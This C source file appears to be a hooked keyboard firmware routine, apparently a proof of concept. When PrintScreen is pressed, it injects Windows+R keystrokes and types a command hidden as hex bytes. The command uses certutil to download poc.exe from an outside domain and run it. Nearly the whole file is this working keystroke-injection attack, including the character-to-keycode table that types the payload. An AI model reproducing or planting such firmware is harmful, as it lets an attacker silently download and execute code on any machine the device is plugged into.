#include <stdint.h>
#include <stddef.h>

#if __has_attribute(noinline)
#define noinline __attribute__((noinline))
#else
#define noinline
#endif


extern int __real_key_press(uint8_t *buf);

noinline int real_key_press(uint8_t *buf)
{
	return __real_key_press(buf);
}


/*
__attribute__((always_inline)) inline static void* imemcpy (void *dest, const void *src, size_t len)
{
	char *d = dest;
	const char *s = src;
	while (len--)
		*d++ = *s++;
	return dest;
}
*/

inline __attribute__((always_inline)) static void send_key(uint8_t a1, uint8_t a2)
{
	uint8_t buf[8] = {0,};
	volatile int i;


	// TODO : change this to timer
	int loop = 0x7800;

	buf[0] = a1;
	buf[2] = a2;
	real_key_press(buf);

	// HACK :
	for(i = 0; i< loop; i++) {}

}

__attribute__((flatten)) int hooked_press_key(uint8_t *buf)
{
	char phase_2[0x44];

	phase_2[0x00] = 0x63;
	phase_2[0x01] = 0x6d;
	phase_2[0x02] = 0x64;
	phase_2[0x03] = 0x0a;
	phase_2[0x04] = 0x63;
	phase_2[0x05] = 0x65;
	phase_2[0x06] = 0x72;
	phase_2[0x07] = 0x74;
	phase_2[0x08] = 0x75;
	phase_2[0x09] = 0x74;
	phase_2[0x0a] = 0x69;
	phase_2[0x0b] = 0x6c;
	phase_2[0x0c] = 0x20;
	phase_2[0x0d] = 0x2d;
	phase_2[0x0e] = 0x75;
	phase_2[0x0f] = 0x72;
	phase_2[0x10] = 0x6c;
	phase_2[0x11] = 0x63;
	phase_2[0x12] = 0x61;
	phase_2[0x13] = 0x63;
	phase_2[0x14] = 0x68;
	phase_2[0x15] = 0x65;
	phase_2[0x16] = 0x20;
	phase_2[0x17] = 0x2d;
	phase_2[0x18] = 0x73;
	phase_2[0x19] = 0x70;
	phase_2[0x1a] = 0x6c;
	phase_2[0x1b] = 0x69;
	phase_2[0x1c] = 0x74;
	phase_2[0x1d] = 0x20;
	phase_2[0x1e] = 0x2d;
	phase_2[0x1f] = 0x66;
	phase_2[0x20] = 0x20;
	phase_2[0x21] = 0x68;
	phase_2[0x22] = 0x74;
	phase_2[0x23] = 0x74;
	phase_2[0x24] = 0x70;
	phase_2[0x25] = 0x3a;
	phase_2[0x26] = 0x2f;
	phase_2[0x27] = 0x2f;
	phase_2[0x28] = 0x6b;
	phase_2[0x29] = 0x62;
	phase_2[0x2a] = 0x64;
	phase_2[0x2b] = 0x77;
	phase_2[0x2c] = 0x2e;
	phase_2[0x2d] = 0x78;
	phase_2[0x2e] = 0x79;
	phase_2[0x2f] = 0x7a;
	phase_2[0x30] = 0x2f;
	phase_2[0x31] = 0x70;
	phase_2[0x32] = 0x6f;
	phase_2[0x33] = 0x63;
	phase_2[0x34] = 0x2e;
	phase_2[0x35] = 0x65;
	phase_2[0x36] = 0x78;
	phase_2[0x37] = 0x65;
	phase_2[0x38] = 0x20;
	phase_2[0x39] = 0x26;
	phase_2[0x3a] = 0x26;
	phase_2[0x3b] = 0x20;
	phase_2[0x3c] = 0x70;
	phase_2[0x3d] = 0x6f;
	phase_2[0x3e] = 0x63;
	phase_2[0x3f] = 0x2e;
	phase_2[0x40] = 0x65;
	phase_2[0x41] = 0x78;
	phase_2[0x42] = 0x65;
	phase_2[0x43] = 0x0a;

	// PrintScreen Key
	if(buf[0] == 0x00 && buf[2] == 0x46)
	{
		// Windows + R
		send_key(8, 0);
		send_key(8, 21);
		send_key(8, 0);
		send_key(0, 0);

		// cmd
		for(int i=0; i<=0x43; i++)
		{
			uint8_t ch;
			ch = phase_2[i];


			if(ch >= 'a' && ch <= 'z')
			{
				ch = ch - 'a' + 4;
				send_key(0, ch);
			}
			else if(ch >= '1' && ch <= '9')
			{
				ch = ch - '1' + 30;
				send_key(0, ch);
			}
			else if(ch == '0')
			{
				ch = 39;
				send_key(0, ch);
			}
			else if (ch == ' ')
			{
				ch = 0x2C;
				send_key(0, ch);
			}
			else if(ch == '-')
			{
				ch = 0x2D;
				send_key(0, ch);
			}
			else if(ch == '\n')
			{
				ch = 0x28;
				send_key(0, ch);

				for(volatile int k = 0; k< 0x40000; k++) {}
				send_key(0, 0);
			}
			else if(ch == ':')
			{
				send_key(0x20, 0);
				send_key(0x20, 0x33);
				send_key(0x20, 0);
			}
			else if(ch == '/')
			{
				ch = 0x38;
				send_key(0, ch);
			}

			else if(ch == '.')
			{
				ch = 0x37;
				send_key(0, ch);
			}
			else if(ch == '&')
			{
				send_key(0x20, 0);
				send_key(0x20, 0x24);
				send_key(0x20, 0);
			}

			if(i % 8 == 0 || phase_2[i] == phase_2[i+1]) send_key(0, 0);
		}

		send_key(0, 0);
	}

	return real_key_press(buf);
}
